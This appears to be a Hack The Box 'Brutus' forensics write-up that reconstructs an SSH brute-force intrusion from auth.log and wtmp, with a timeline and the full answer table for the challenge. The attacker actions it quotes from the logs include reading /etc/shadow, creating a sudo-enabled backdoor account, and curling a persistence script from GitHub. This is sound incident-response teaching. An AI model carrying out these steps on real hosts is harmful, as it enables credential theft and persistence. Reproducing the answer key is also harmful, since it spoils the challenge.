@@ -1,0 +1,213 @@
+HTB Sherlock: Brutus — My Writeup
+Prepared by: iThistle
+Difficulty: Very Easy | 195 XP | Solved: 14 Nov 2026
+
+The Scenario
+An SSH server on an AWS instance (running Confluence) was brute-forced. We get two forensic artifacts: the Linux authentication log and the login records. Our job: reconstruct exactly what the attacker did — how they got in, how they stayed in, and what they ran.
+
+Artifacts
+Brutus.zip (password: hacktheblue) contains:
+
+File	What it is
+auth.log	Linux auth log — SSH, sudo, account changes, cron. 385 lines.
+wtmp	Binary record of every login session. Needs a parser.
+utmp.py	HTB's parser for wtmp.
+The zip uses AES encryption, so plain unzip fails with unsupported compression method 99. Use bsdtar (or 7z):
+
+bash
+mkdir Brutus && cd Brutus
+bsdtar --passphrase hacktheblue -xf ../Brutus.zip
+sha256sum auth.log wtmp utmp.py
+Always verify hashes before analysis — this proves your evidence is intact and unmodified.
+
+Lesson learned the hard way: never open log files in office software. LibreOffice reflowed 385 lines into 2 and added backslashes to every bracket. Plain text editor or terminal only.
+
+Host: ip-172-31-35-28
+Log breakdown: 104 lines are CRON (the confluence user), 257 are sshd — the incident lives in those 257.
+
+Stage 1 — Find the Brute Force
+A brute force looks like many failed logins from one source. Count failures per IP:
+
+bash
+grep 'Failed password' auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c
+sort must come before uniq -c — uniq only collapses adjacent identical lines.
+
+Result: all 48 failures come from one address. Nothing else has a single failure. Two signs this was automated:
+
+Speed: all 48 attempts fall between 06:31:33 and 06:31:42 — a 9-second window.
+
+Usernames: the tool guessed account names too, spreading attempts across five users:
+
+Username	Failed attempts	Exists on server?
+server_adm	12	no
+svc_account	11	no
+admin	10	no
+backup	9	yes
+root	6	yes
+sshd also logged MaxStartups throttling from 06:31:31 and 21 dropped connections — the attacker opened connections faster than the server would accept.
+
+Attacker IP: 65.2.161.68
+
+Stage 2 — Which Account Was Compromised?
+Failures show attempts; Accepted lines show the result:
+
+bash
+grep 'Accepted' auth.log | grep 65.2.161.68
+Time	User	Source
+06:19:54	root	203.101.190.9
+06:31:40	root	65.2.161.68
+06:32:44	root	65.2.161.68
+06:37:34	cyberjunkie	65.2.161.68
+The attacker got in as root — one of the guessed accounts. cyberjunkie was never guessed; the attacker created it (Stage 5).
+
+Distractor: 203.101.190.9 is not the attacker. It has zero failed attempts before it, logged in 12 minutes before the attack began, and wtmp shows the same address logging in as root on 2024-01-25 and 2024-02-11. That looks like legitimate admin activity — the logs can't prove who used it, but it isn't part of this intrusion.
+
+Compromised account: root
+
+Stage 3 — When Did the Attacker Open a Terminal?
+This is the key concept of the whole challenge: auth.log records authentication (password accepted). wtmp records a session (terminal opened). They are different events, one second apart.
+
+wtmp is binary, so use the provided parser. Force UTC — the parser prints in the machine's local timezone:
+
+bash
+TZ=UTC python3 -I utmp.py wtmp
+-I stops Python importing code from the current directory — important here because that directory holds files from a downloaded archive.
+
+Root logins from the attacker's IP in wtmp:
+
+text
+USER  2549  pts/1  root         65.2.161.68  2024/03/06 06:32:45
+DEAD  2491  pts/1                            2024/03/06 06:37:24
+USER  2667  pts/1  cyberjunkie  65.2.161.68  2024/03/06 06:37:35
+auth.log has two root logins from this IP, but wtmp shows only one terminal. Why?
+
+06:31:40 — the automated brute-force success. It opened and closed in the same second. No terminal.
+
+06:32:44 — the person at the keyboard. Terminal opened one second later, at 06:32:45.
+
+Cross-check: read the raw epoch from the binary — 1709706765 = 2024-03-06 06:32:45 UTC. Matches the parser exactly.
+
+Answer format tip: the parser prints dates with slashes (2024/03/06). HTB wants ISO format with dashes. Don't get rejected on formatting.
+
+Manual login: 2024-03-06 06:32:45
+
+Stage 4 — Session Number
+systemd-logind numbers every login with a New session line:
+
+bash
+grep 'New session' auth.log
+Time	User	Session
+06:19:54	root (other IP)	6
+06:31:40	root (automated)	34
+06:32:44	root (manual)	37
+06:37:34	cyberjunkie	49
+Root has three sessions, so the username alone is not enough — the timestamp picks the right one. Cross-check: sshd[2491] appears in auth.log and as the DEAD record in wtmp — same process, same session.
+
+Session number: 37
+
+Stage 5 — Persistence: New Account
+Account changes are logged by the tools that make them:
+
+bash
+grep -E 'useradd|usermod|groupadd' auth.log
+text
+06:34:18  groupadd  new group: name=cyberjunkie, GID=1002
+06:34:18  useradd   new user: name=cyberjunkie, UID=1002, GID=1002,
+                    home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
+06:35:15  usermod   add 'cyberjunkie' to group 'sudo'
+Two things confirm this is the attacker's work:
+
+from=/dev/pts/1 — the same terminal wtmp recorded for the manual root session. The account was created from that session.
+
+add to group 'sudo' — that's the privilege escalation. A sudo-group member can run anything as root.
+
+A passwd change at 06:34:26 and chfn at 06:34:31 show the account got a password and profile details within a minute of creation.
+
+Backdoor account: cyberjunkie
+
+Stage 6 — MITRE ATT&CK Mapping
+The attacker created a local account on the machine itself — not a domain or cloud account.
+
+Action	Technique	ID
+Create local user	Create Account: Local Account	T1136.001
+Add to sudo group	Account Manipulation	T1098
+Use sudo for root	Abuse Elevation Control: Sudo	T1548.003
+Login with valid root creds	Valid Accounts	T1078
+The question asks specifically about account creation → T1136.001. The others complete the picture for a full report.
+
+Stage 7 — When Did the First Terminal Session End?
+Sessions end with a Removed session line from systemd-logind and a matching session closed from sshd:
+
+bash
+grep -E 'Removed session|session closed for user root' auth.log
+text
+06:37:24  sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
+06:37:24  systemd-logind: Session 37 logged out.
+06:37:24  systemd-logind: Removed session 37.
+Duration: 06:32:44 → 06:37:24 = 4 minutes 40 seconds. The attacker disconnected themselves. wtmp agrees with a DEAD record at the same second. Ten seconds later they logged back in as cyberjunkie.
+
+Ambiguity note: session 34 was technically the attacker's first and ended at 06:31:40 — the same second it opened. This question means the terminal session followed since Stage 3. HTB accepts that reading. In a real report, state both interpretations and justify your choice.
+
+Session end: 2024-03-06 06:37:24
+
+Stage 8 — The sudo Command That Downloaded a Script
+sudo logs the full command line of every use:
+
+bash
+grep 'COMMAND' auth.log
+text
+06:37:57  cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ;
+          COMMAND=/usr/bin/cat /etc/shadow
+06:39:38  cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ;
+          COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+First command: reads /etc/shadow — the password hashes, root-only. Credential access.
+
+Second command: downloads a script from a public GitHub repo. This is the one the question asks for.
+
+Honest limitation: auth.log records the download. It does not show the script being run or where it was saved. We don't claim either. The repo name suggests a persistence tool, but that's inference, not a finding.
+
+Full sudo command:
+
+text
+/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+Timeline (single view)
+Time (UTC)	Event	Source
+06:19:54	root login from 203.101.190.9 (unrelated)	auth.log
+06:31:31	MaxStartups throttling begins	auth.log
+06:31:33–42	48 failed passwords from 65.2.161.68	auth.log
+06:31:40	Automated root login succeeds (session 34, no terminal)	auth.log
+06:32:44	Manual root login (session 37)	auth.log
+06:32:45	Root terminal opens on pts/1	wtmp
+06:34:18	cyberjunkie user + group created	auth.log
+06:35:15	cyberjunkie added to sudo	auth.log
+06:37:24	Session 37 ends (attacker disconnects)	auth.log + wtmp
+06:37:34	cyberjunkie login (session 49)	auth.log
+06:37:57	sudo: cat /etc/shadow	auth.log
+06:39:38	sudo: curl ... linper.sh	auth.log
+Total intrusion window: ~8 minutes.
+
+Answers
+#	Question	Answer
+1	Attacker IP for brute force	65.2.161.68
+2	Compromised account	root
+3	Manual terminal login (UTC)	2024-03-06 06:32:45
+4	Session number for that login	37
+5	New persistence account	cyberjunkie
+6	MITRE sub-technique for account creation	T1136.001
+7	First terminal session end	2024-03-06 06:37:24
+8	Full sudo command that downloaded the script	/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+Key Takeaways
+auth.log ≠ wtmp. Authentication is not a session. One second of difference separates them — and that second is the whole point of Stage 3.
+
+Correlate by PID. sshd[2491] in auth.log ↔ DEAD record in wtmp proves two artifacts describe the same event.
+
+UTC everywhere. Set TZ=UTC, check the raw epoch, match the parser. Don't let a timezone shift ruin an answer.
+
+Separate observation from inference. The log shows a download — not execution. Say what you saw, not what you assume.
+
+A brute force has a fingerprint: one source, high speed, multiple usernames, throttling events. Learn to recognize it.
+
+Distractors are real. 203.101.190.9 looks suspicious until you check the timeline and wtmp history. Evidence, not vibes.
+
+Prepared by iThistle — HTB Sherlock: Brutus, solved 14 Nov 2026.
+
